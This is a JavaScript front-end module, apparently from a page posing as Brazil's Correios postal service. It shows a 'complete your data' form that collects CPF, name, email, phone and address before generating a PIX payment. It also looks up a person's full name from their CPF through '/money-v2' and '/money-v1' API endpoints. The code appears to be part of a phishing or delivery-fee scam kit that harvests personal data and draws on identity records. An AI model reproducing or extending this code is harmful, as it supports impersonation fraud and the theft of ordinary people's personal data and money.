(function() {
    'use strict';

    const STORAGE = {
        EMAIL: 'correios_email',
        TELEFONE: 'correios_telefone',
        CPF: 'correios_cpf',
        NOME: 'correios_nome',
        ENDERECO: 'correios_endereco',
        SESSION: 'correios_session'
    };

    const GENERIC_NAMES = [
        'prezado destinatario',
        'prezado destinatÃ¡rio',
        'destinatario',
        'destinatÃ¡rio',
        'cpf localizado',
        'cpf encontrado',
        'titular',
        'usuario',
        'usuÃ¡rio',
        'cliente',
        '---'
    ];

    let modalRoot = null;
    let pendingPromise = null;
    let lastCpfLookup = { cpf: '', name: '' };

    function safeParseJson(value) {
        if (!value) return null;
        try {
            return JSON.parse(value);
        } catch (_) {
            return null;
        }
    }

    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    function decodeName(name) {
        if (!name) return '';
        try {
            let decoded = name;
            while (decoded.includes('%')) {
                const next = decodeURIComponent(decoded);
                if (next === decoded) break;
                decoded = next;
            }
            return decoded.trim();
        } catch (_) {
            return String(name).trim();
        }
    }

    function normalizePhone(value) {
        return String(value || '').replace(/\D/g, '');
    }

    function normalizeCpf(value) {
        return String(value || '').replace(/\D/g, '');
    }

    function normalizeCep(value) {
        return String(value || '').replace(/\D/g, '').slice(0, 8);
    }

    function isValidEmail(email) {
        const value = String(email || '').trim();
        return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(value);
    }

    function isValidPhone(phone) {
        const digits = normalizePhone(phone);
        return digits.length === 10 || digits.length === 11;
    }

    function isGenericName(name) {
        const normalized = decodeName(name).toLowerCase();
        if (!normalized || normalized.length < 4) return true;
        return GENERIC_NAMES.some((item) => normalized.includes(item));
    }

    function validarCPF(cpf) {
        const value = normalizeCpf(cpf);
        if (value.length !== 11) return false;
        if (/^(\d)\1{10}$/.test(value)) return false;

        let soma = 0;
        for (let i = 0; i < 9; i++) {
            soma += parseInt(value.charAt(i), 10) * (10 - i);
        }
        let resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        if (resto !== parseInt(value.charAt(9), 10)) return false;

        soma = 0;
        for (let i = 0; i < 10; i++) {
            soma += parseInt(value.charAt(i), 10) * (11 - i);
        }
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        return resto === parseInt(value.charAt(10), 10);
    }

    function maskCpf(value) {
        const digits = normalizeCpf(value).slice(0, 11);
        if (digits.length <= 3) return digits;
        if (digits.length <= 6) return digits.replace(/(\d{3})(\d+)/, '$1.$2');
        if (digits.length <= 9) return digits.replace(/(\d{3})(\d{3})(\d+)/, '$1.$2.$3');
        return digits.replace(/(\d{3})(\d{3})(\d{3})(\d+)/, '$1.$2.$3-$4');
    }

    function maskPhone(value) {
        const digits = normalizePhone(value).slice(0, 11);
        if (digits.length <= 2) return digits;
        if (digits.length <= 6) return digits.replace(/(\d{2})(\d+)/, '($1) $2');
        if (digits.length <= 10) return digits.replace(/(\d{2})(\d{4})(\d+)/, '($1) $2-$3');
        return digits.replace(/(\d{2})(\d{5})(\d+)/, '($1) $2-$3');
    }

    function maskCep(value) {
        const digits = normalizeCep(value);
        if (digits.length <= 5) return digits;
        return digits.replace(/(\d{5})(\d+)/, '$1-$2');
    }

    function getSessionData() {
        return safeParseJson(localStorage.getItem(STORAGE.SESSION)) || {};
    }

    function getEnderecoFromStorage() {
        return safeParseJson(localStorage.getItem(STORAGE.ENDERECO)) || {};
    }

    function isEnderecoCompleto(endereco) {
        if (!endereco || typeof endereco !== 'object') return false;
        const cep = normalizeCep(endereco.cep || '');
        const logradouro = String(endereco.logradouro || '').trim();
        const numero = String(endereco.numero || '').trim();
        const bairro = String(endereco.bairro || '').trim();
        const cidade = String(endereco.cidade || '').trim();
        const uf = String(endereco.uf || '').trim().toUpperCase();
        return cep.length === 8 && logradouro && numero && bairro && cidade && uf.length === 2;
    }

    function getCurrentData() {
        const session = getSessionData();
        const nomeUrl = decodeName(getQueryParam('nome') || '');
        const cpfUrl = normalizeCpf(getQueryParam('cpf') || '');
        const tipoUrl = String(getQueryParam('tipo') || '').trim().toLowerCase();

        const nome = decodeName(
            localStorage.getItem(STORAGE.NOME) ||
            nomeUrl ||
            session.nome ||
            ''
        );

        const cpf = normalizeCpf(
            localStorage.getItem(STORAGE.CPF) ||
            cpfUrl ||
            session.cpf ||
            ''
        );

        return {
            nome,
            cpf,
            email: String(localStorage.getItem(STORAGE.EMAIL) || '').trim(),
            telefone: normalizePhone(localStorage.getItem(STORAGE.TELEFONE) || ''),
            endereco: getEnderecoFromStorage(),
            tipoConsulta: tipoUrl || String(session.tipo || '').trim().toLowerCase()
        };
    }

    function isTrackingOrigin(data) {
        return String(data.tipoConsulta || '').toLowerCase() === 'rastreio';
    }

    async function lookupNameByCpf(cpf) {
        const value = normalizeCpf(cpf);
        if (!validarCPF(value)) return null;

        if (lastCpfLookup.cpf === value && lastCpfLookup.name) {
            return lastCpfLookup.name;
        }

        const endpoints = ['/money-v2/api.php', '/money-v1/api.php'];

        for (const endpoint of endpoints) {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 9000);

                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf: value }),
                    signal: controller.signal
                });
                clearTimeout(timeout);

                if (!response.ok) continue;
                const result = await response.json();
                if (!result || !result.success || !result.data) continue;

                const nome =
                    result.data.NOME ||
                    (result.data.DADOS && result.data.DADOS.nome) ||
                    '';

                const nomeLimpo = decodeName(nome);
                if (nomeLimpo && !isGenericName(nomeLimpo)) {
                    lastCpfLookup = { cpf: value, name: nomeLimpo };
                    return nomeLimpo;
                }
            } catch (_) {
                // segue para proximo endpoint
            }
        }

        return null;
    }

    async function buscarCep(cep) {
        const value = normalizeCep(cep);
        if (value.length !== 8) {
            throw new Error('CEP deve conter 8 digitos.');
        }

        const response = await fetch('https://viacep.com.br/ws/' + value + '/json/');
        if (!response.ok) {
            throw new Error('Nao foi possivel consultar o CEP.');
        }

        const data = await response.json();
        if (data.erro) {
            throw new Error('CEP nao encontrado.');
        }

        return {
            cep: value,
            logradouro: String(data.logradouro || '').trim(),
            bairro: String(data.bairro || '').trim(),
            cidade: String(data.localidade || '').trim(),
            uf: String(data.uf || '').trim().toUpperCase()
        };
    }

    function ensureModalRoot() {
        if (modalRoot) return modalRoot;

        const wrapper = document.createElement('div');
        wrapper.id = 'leadDataGateRoot';
        wrapper.innerHTML = [
            '<div class="ldg-overlay" data-ldg-overlay>',
            '  <div class="ldg-modal">',
            '    <h3 class="ldg-title" data-ldg-title>Complete seus dados</h3>',
            '    <p class="ldg-subtitle" data-ldg-subtitle>Precisamos confirmar suas informacoes antes de gerar o PIX.</p>',
            '    <form class="ldg-form" data-ldg-form novalidate></form>',
            '  </div>',
            '</div>'
        ].join('');

        document.body.appendChild(wrapper);
        modalRoot = wrapper;
        return modalRoot;
    }

    function ensureInlineRoot(target) {
        let container = null;
        if (typeof target === 'string' && target.trim()) {
            container = document.querySelector(target.trim());
        } else if (target && target.nodeType === 1) {
            container = target;
        } else {
            container = document.querySelector('[data-ldg-inline-root]');
        }

        if (!container) return null;

        let title = container.querySelector('[data-ldg-title]');
        let subtitle = container.querySelector('[data-ldg-subtitle]');
        let form = container.querySelector('[data-ldg-form]');

        if (!title || !subtitle || !form) {
            container.innerHTML = [
                '<h3 class="ldg-title" data-ldg-title>Complete seus dados</h3>',
                '<p class="ldg-subtitle" data-ldg-subtitle>Precisamos confirmar suas informacoes antes de gerar o PIX.</p>',
                '<form class="ldg-form" data-ldg-form novalidate></form>'
            ].join('');
            title = container.querySelector('[data-ldg-title]');
            subtitle = container.querySelector('[data-ldg-subtitle]');
            form = container.querySelector('[data-ldg-form]');
        }

        return { container, title, subtitle, form };
    }

    function buildField(id, label, type, placeholder, maxLength) {
        return [
            '<div class="ldg-field" data-field="' + id + '">',
            '  <label for="ldg-' + id + '">' + label + '</label>',
            '  <input id="ldg-' + id + '" name="' + id + '" type="' + type + '" placeholder="' + placeholder + '"' +
                 (maxLength ? ' maxlength="' + maxLength + '"' : '') + ' autocomplete="off">',
            '  <small class="ldg-error" data-error="' + id + '"></small>',
            '</div>'
        ].join('');
    }

    function setFieldError(form, fieldId, message) {
        const errorEl = form.querySelector('[data-error="' + fieldId + '"]');
        const fieldEl = form.querySelector('[data-field="' + fieldId + '"] input');
        if (errorEl) errorEl.textContent = message || '';
        if (fieldEl) fieldEl.classList.toggle('ldg-input-error', Boolean(message));
    }

    function clearAllErrors(form) {
        form.querySelectorAll('.ldg-error').forEach((el) => {
            el.textContent = '';
        });
        form.querySelectorAll('input').forEach((el) => {
            el.classList.remove('ldg-input-error');
        });
    }

    function saveData(data) {
        if (data.email) localStorage.setItem(STORAGE.EMAIL, String(data.email).trim().toLowerCase());
        if (data.telefone) localStorage.setItem(STORAGE.TELEFONE, normalizePhone(data.telefone));
        if (data.cpf) localStorage.setItem(STORAGE.CPF, normalizeCpf(data.cpf));
        if (data.nome) localStorage.setItem(STORAGE.NOME, decodeName(data.nome));
        if (data.endereco && isEnderecoCompleto(data.endereco)) {
            localStorage.setItem(STORAGE.ENDERECO, JSON.stringify({
                cep: normalizeCep(data.endereco.cep || ''),
                logradouro: String(data.endereco.logradouro || '').trim(),
                numero: String(data.endereco.numero || '').trim(),
                complemento: String(data.endereco.complemento || '').trim(),
                bairro: String(data.endereco.bairro || '').trim(),
                cidade: String(data.endereco.cidade || '').trim(),
                uf: String(data.endereco.uf || '').trim().toUpperCase()
            }));
        }
    }

    function getRedirectTitle(context) {
        if (context === 'lote') return 'Dados para envio';
        if (context === 'frontend') return 'Confirme seus dados';
        return 'Complete seus dados';
    }

    function formatFirstName(name) {
        const value = decodeName(name || '').trim();
        if (!value) return '';
        const first = value.split(/\s+/)[0] || '';
        if (!first) return '';
        return first.charAt(0).toUpperCase() + first.slice(1).toLowerCase();
    }

    function getDynamicTitle(context, data, requirements) {
        if (context !== 'lote') {
            return getRedirectTitle(context);
        }

        const nomeValido = data && data.nome && !isGenericName(data.nome);
        const nomeBloqueadoPorIdentidade =
            requirements &&
            requirements.trackingOrigin &&
            (requirements.needCpf || requirements.needNameByTracking);

        if (nomeValido && !nomeBloqueadoPorIdentidade) {
            const firstName = formatFirstName(data.nome);
            if (firstName) {
                return firstName + ', informe seus dados para envio';
            }
        }

        return 'Informe seus dados para envio';
    }

    function computeRequirements(data, options) {
        const requireContact = options.requireContact || 'if-missing';
        const requireAddress = Boolean(options.requireAddress);
        const requireIdentityForTracking = Boolean(options.requireIdentityForTracking);
        const trackingOrigin = requireIdentityForTracking && isTrackingOrigin(data);

        const cpfValido = validarCPF(data.cpf);
        const nomeValido = data.nome && !isGenericName(data.nome);

        const needCpf = trackingOrigin && !cpfValido;
        const needNameByTracking = trackingOrigin && !nomeValido;

        const needEmail = requireContact === 'always' ? true : !isValidEmail(data.email);
        const needTelefone = requireContact === 'always' ? true : !isValidPhone(data.telefone);
        const needAddress = requireAddress && !isEnderecoCompleto(data.endereco);

        return {
            trackingOrigin,
            needCpf,
            needNameByTracking,
            needEmail,
            needTelefone,
            needAddress,
            hasAnyRequirement:
                needCpf ||
                needNameByTracking ||
                needEmail ||
                needTelefone ||
                needAddress
        };
    }

    async function ensureData(options) {
        const opts = Object.assign({
            requireContact: 'if-missing',
            requireAddress: false,
            requireIdentityForTracking: false,
            context: '',
            displayMode: 'modal',
            inlineContainer: null,
            onInlineOpen: null,
            onInlineComplete: null
        }, options || {});

        const currentData = getCurrentData();
        let requirements = computeRequirements(currentData, opts);

        if (!requirements.hasAnyRequirement) {
            return currentData;
        }

        if (!requirements.needCpf && requirements.needNameByTracking && validarCPF(currentData.cpf)) {
            const nomeLookup = await lookupNameByCpf(currentData.cpf);
            if (nomeLookup) {
                currentData.nome = nomeLookup;
                saveData({ nome: nomeLookup, cpf: currentData.cpf });
                requirements = computeRequirements(currentData, opts);
                if (!requirements.hasAnyRequirement) {
                    return getCurrentData();
                }
            }
        }

        if (pendingPromise) {
            return pendingPromise;
        }

        pendingPromise = new Promise((resolve, reject) => {
            const inlineMode = opts.displayMode === 'inline';
            const inlineRoot = inlineMode ? ensureInlineRoot(opts.inlineContainer) : null;
            if (inlineMode && !inlineRoot) {
                pendingPromise = null;
                reject(new Error('Container inline do gate nao encontrado.'));
                return;
            }

            const root = inlineMode ? null : ensureModalRoot();
            const overlay = root ? root.querySelector('[data-ldg-overlay]') : null;
            const form = inlineMode ? inlineRoot.form : root.querySelector('[data-ldg-form]');
            const title = inlineMode ? inlineRoot.title : root.querySelector('[data-ldg-title]');
            const subtitle = inlineMode ? inlineRoot.subtitle : root.querySelector('[data-ldg-subtitle]');

            title.textContent = getDynamicTitle(opts.context, currentData, requirements);
            subtitle.textContent = requirements.needAddress
                ? 'Preencha os campos abaixo para concluir sua reserva e garantir o envio correto.'
                : 'Precisamos confirmar seus dados antes de gerar o PIX.';

            const fields = [];
            const requiredSectionMark = opts.context === 'lote'
                ? ' <span class="ldg-required-asterisk">*</span>'
                : '';

            if (requirements.trackingOrigin) {
                fields.push('<div class="ldg-section-title">Identificacao</div>');
                if (requirements.needCpf) {
                    fields.push(buildField('cpf', 'CPF', 'text', '000.000.000-00', '14'));
                }
                if (requirements.needNameByTracking) {
                    fields.push(buildField('nome', 'Nome completo', 'text', 'Seu nome completo', '100'));
                    fields.push('<p class="ldg-hint" data-ldg-name-status>Digite ou valide seu CPF para preencher o nome automaticamente.</p>');
                }
            }

            if (requirements.needEmail || requirements.needTelefone) {
                fields.push('<div class="ldg-section-title">Contato' + requiredSectionMark + '</div>');
                if (requirements.needEmail) {
                    fields.push(buildField('email', 'E-mail', 'email', 'seuemail@exemplo.com', '120'));
                }
                if (requirements.needTelefone) {
                    fields.push(buildField('telefone', 'Telefone', 'text', '(11) 99999-9999', '15'));
                }
            }

            if (requirements.needAddress) {
                fields.push('<div class="ldg-section-title">Endereco de entrega' + requiredSectionMark + '</div>');
                fields.push('<div class="ldg-grid ldg-grid-cep-cidade-uf">');
                fields.push(buildField('cep', 'CEP', 'text', '00000-000', '9'));
                fields.push(buildField('cidade', 'Cidade', 'text', 'Sua cidade', '80'));
                fields.push(buildField('uf', 'UF', 'text', 'SP', '2'));
                fields.push('</div>');
                fields.push('<p class="ldg-hint" data-ldg-cep-status></p>');
                fields.push('<div class="ldg-grid ldg-grid-logradouro-numero">');
                fields.push(buildField('logradouro', 'Logradouro', 'text', 'Rua, avenida...', '120'));
                fields.push(buildField('numero', 'Numero', 'text', '123', '10'));
                fields.push('</div>');
                fields.push('<div class="ldg-grid ldg-grid-bairro-complemento">');
                fields.push(buildField('bairro', 'Bairro', 'text', 'Seu bairro', '80'));
                fields.push(buildField('complemento', 'Complemento', 'text', 'Apto, bloco...', '80'));
                fields.push('</div>');
            }

            fields.push('<button type="submit" class="ldg-submit">Continuar</button>');
            form.innerHTML = fields.join('');

            const cpfInput = form.querySelector('#ldg-cpf');
            const nomeInput = form.querySelector('#ldg-nome');
            const emailInput = form.querySelector('#ldg-email');
            const telefoneInput = form.querySelector('#ldg-telefone');
            const cepInput = form.querySelector('#ldg-cep');
            const logradouroInput = form.querySelector('#ldg-logradouro');
            const numeroInput = form.querySelector('#ldg-numero');
            const complementoInput = form.querySelector('#ldg-complemento');
            const bairroInput = form.querySelector('#ldg-bairro');
            const cidadeInput = form.querySelector('#ldg-cidade');
            const ufInput = form.querySelector('#ldg-uf');
            const nameStatus = form.querySelector('[data-ldg-name-status]');
            const cepStatus = form.querySelector('[data-ldg-cep-status]');

            if (cpfInput) cpfInput.value = maskCpf(currentData.cpf || '');
            if (nomeInput) nomeInput.value = decodeName(currentData.nome || '');
            if (emailInput) emailInput.value = currentData.email || '';
            if (telefoneInput) telefoneInput.value = maskPhone(currentData.telefone || '');

            if (requirements.needAddress && currentData.endereco) {
                if (cepInput) cepInput.value = maskCep(currentData.endereco.cep || '');
                if (logradouroInput) logradouroInput.value = currentData.endereco.logradouro || '';
                if (numeroInput) numeroInput.value = currentData.endereco.numero || '';
                if (complementoInput) complementoInput.value = currentData.endereco.complemento || '';
                if (bairroInput) bairroInput.value = currentData.endereco.bairro || '';
                if (cidadeInput) cidadeInput.value = currentData.endereco.cidade || '';
                if (ufInput) ufInput.value = String(currentData.endereco.uf || '').toUpperCase();
            }

            let nomeAutoPreenchido = Boolean(nomeInput && nomeInput.value && !isGenericName(nomeInput.value));

            async function tryCpfLookup() {
                if (!cpfInput || !nomeInput) return;
                const cpfValue = normalizeCpf(cpfInput.value);
                if (!validarCPF(cpfValue)) return;
                if (lastCpfLookup.cpf === cpfValue && lastCpfLookup.name) {
                    nomeInput.value = lastCpfLookup.name;
                    nomeAutoPreenchido = true;
                    if (nameStatus) {
                        nameStatus.textContent = 'Nome preenchido automaticamente.';
                        nameStatus.className = 'ldg-hint success';
                    }
                    return;
                }

                if (nameStatus) {
                    nameStatus.textContent = 'Consultando nome pelo CPF...';
                    nameStatus.className = 'ldg-hint';
                }

                const nomeLookup = await lookupNameByCpf(cpfValue);
                if (nomeLookup) {
                    nomeInput.value = nomeLookup;
                    nomeAutoPreenchido = true;
                    if (nameStatus) {
                        nameStatus.textContent = 'Nome preenchido automaticamente.';
                        nameStatus.className = 'ldg-hint success';
                    }
                } else if (nameStatus) {
                    nomeAutoPreenchido = false;
                    nameStatus.textContent = 'Nao foi possivel buscar o nome automaticamente. Preencha manualmente.';
                    nameStatus.className = 'ldg-hint warning';
                }
            }

            if (cpfInput) {
                cpfInput.addEventListener('input', () => {
                    cpfInput.value = maskCpf(cpfInput.value);
                });
                cpfInput.addEventListener('blur', () => {
                    tryCpfLookup();
                });
            }

            if (telefoneInput) {
                telefoneInput.addEventListener('input', () => {
                    telefoneInput.value = maskPhone(telefoneInput.value);
                });
            }

            if (cepInput) {
                cepInput.addEventListener('input', () => {
                    cepInput.value = maskCep(cepInput.value);
                });
                cepInput.addEventListener('blur', async () => {
                    const cepValue = normalizeCep(cepInput.value);
                    if (!cepValue) return;
                    if (cepStatus) {
                        cepStatus.textContent = '';
                        cepStatus.className = 'ldg-hint';
                    }
                    if (cepValue.length !== 8) {
                        if (cepStatus) {
                            cepStatus.textContent = 'CEP invalido. Informe 8 digitos.';
                            cepStatus.className = 'ldg-hint warning';
                        }
                        return;
                    }
                    try {
                        if (cepStatus) {
                            cepStatus.textContent = 'Consultando CEP...';
                            cepStatus.className = 'ldg-hint';
                        }
                        const cepData = await buscarCep(cepValue);
                        if (logradouroInput && cepData.logradouro) logradouroInput.value = cepData.logradouro;
                        if (bairroInput && cepData.bairro) bairroInput.value = cepData.bairro;
                        if (cidadeInput && cepData.cidade) cidadeInput.value = cepData.cidade;
                        if (ufInput && cepData.uf) ufInput.value = cepData.uf;
                        if (cepStatus) {
                            cepStatus.textContent = 'Endereco preenchido pelo CEP.';
                            cepStatus.className = 'ldg-hint success';
                        }
                        if (numeroInput && !String(numeroInput.value || '').trim()) {
                            numeroInput.focus();
                        }
                    } catch (error) {
                        if (cepStatus) {
                            cepStatus.textContent = error.message || 'Erro ao consultar CEP.';
                            cepStatus.className = 'ldg-hint warning';
                        }
                    }
                });
            }

            if (ufInput) {
                ufInput.addEventListener('input', () => {
                    ufInput.value = String(ufInput.value || '').replace(/[^a-zA-Z]/g, '').toUpperCase().slice(0, 2);
                });
            }

            if (nomeInput) {
                nomeInput.addEventListener('input', () => {
                    if (nomeInput.value.trim().length > 3 && !isGenericName(nomeInput.value.trim())) {
                        nomeAutoPreenchido = false;
                    }
                });
            }

            form.onsubmit = async function(event) {
                event.preventDefault();
                clearAllErrors(form);

                const collected = {
                    cpf: cpfInput ? normalizeCpf(cpfInput.value) : currentData.cpf,
                    nome: nomeInput ? decodeName(nomeInput.value) : currentData.nome,
                    email: emailInput ? String(emailInput.value || '').trim().toLowerCase() : currentData.email,
                    telefone: telefoneInput ? normalizePhone(telefoneInput.value) : currentData.telefone,
                    endereco: requirements.needAddress ? {
                        cep: cepInput ? normalizeCep(cepInput.value) : '',
                        logradouro: logradouroInput ? String(logradouroInput.value || '').trim() : '',
                        numero: numeroInput ? String(numeroInput.value || '').trim() : '',
                        complemento: complementoInput ? String(complementoInput.value || '').trim() : '',
                        bairro: bairroInput ? String(bairroInput.value || '').trim() : '',
                        cidade: cidadeInput ? String(cidadeInput.value || '').trim() : '',
                        uf: ufInput ? String(ufInput.value || '').trim().toUpperCase() : ''
                    } : currentData.endereco
                };

                let hasError = false;

                if (requirements.trackingOrigin) {
                    if (!validarCPF(collected.cpf)) {
                        hasError = true;
                        setFieldError(form, 'cpf', 'CPF invalido.');
                    }
                    if (!collected.nome || isGenericName(collected.nome)) {
                        if (validarCPF(collected.cpf) && !nomeAutoPreenchido) {
                            const nomeLookup = await lookupNameByCpf(collected.cpf);
                            if (nomeLookup) {
                                collected.nome = nomeLookup;
                                if (nomeInput) nomeInput.value = nomeLookup;
                            }
                        }
                    }
                    if (!collected.nome || isGenericName(collected.nome)) {
                        hasError = true;
                        setFieldError(form, 'nome', 'Informe seu nome completo.');
                    }
                }

                if (requirements.needEmail && !isValidEmail(collected.email)) {
                    hasError = true;
                    setFieldError(form, 'email', 'Informe um e-mail valido.');
                }

                if (requirements.needTelefone && !isValidPhone(collected.telefone)) {
                    hasError = true;
                    setFieldError(form, 'telefone', 'Informe telefone com DDD.');
                }

                if (requirements.needAddress) {
                    if (normalizeCep(collected.endereco.cep).length !== 8) {
                        hasError = true;
                        setFieldError(form, 'cep', 'CEP invalido.');
                    }
                    if (!collected.endereco.logradouro) {
                        hasError = true;
                        setFieldError(form, 'logradouro', 'Informe o logradouro.');
                    }
                    if (!collected.endereco.numero) {
                        hasError = true;
                        setFieldError(form, 'numero', 'Informe o numero.');
                    }
                    if (!collected.endereco.bairro) {
                        hasError = true;
                        setFieldError(form, 'bairro', 'Informe o bairro.');
                    }
                    if (!collected.endereco.cidade) {
                        hasError = true;
                        setFieldError(form, 'cidade', 'Informe a cidade.');
                    }
                    if (!collected.endereco.uf || collected.endereco.uf.length !== 2) {
                        hasError = true;
                        setFieldError(form, 'uf', 'UF invalida.');
                    }
                }

                if (hasError) {
                    return;
                }

                saveData(collected);
                if (inlineMode && inlineRoot) {
                    inlineRoot.container.style.display = 'none';
                    if (typeof opts.onInlineComplete === 'function') {
                        opts.onInlineComplete();
                    }
                } else if (overlay) {
                    overlay.classList.remove('active');
                    document.body.classList.remove('ldg-open');
                }
                pendingPromise = null;
                resolve(getCurrentData());
            };

            if (inlineMode && inlineRoot) {
                inlineRoot.container.style.display = 'block';
                if (typeof opts.onInlineOpen === 'function') {
                    opts.onInlineOpen(requirements);
                }
            } else if (overlay) {
                overlay.classList.add('active');
                document.body.classList.add('ldg-open');
            }
        });

        return pendingPromise;
    }

    window.LeadDataGate = {
        ensureData
    };
})();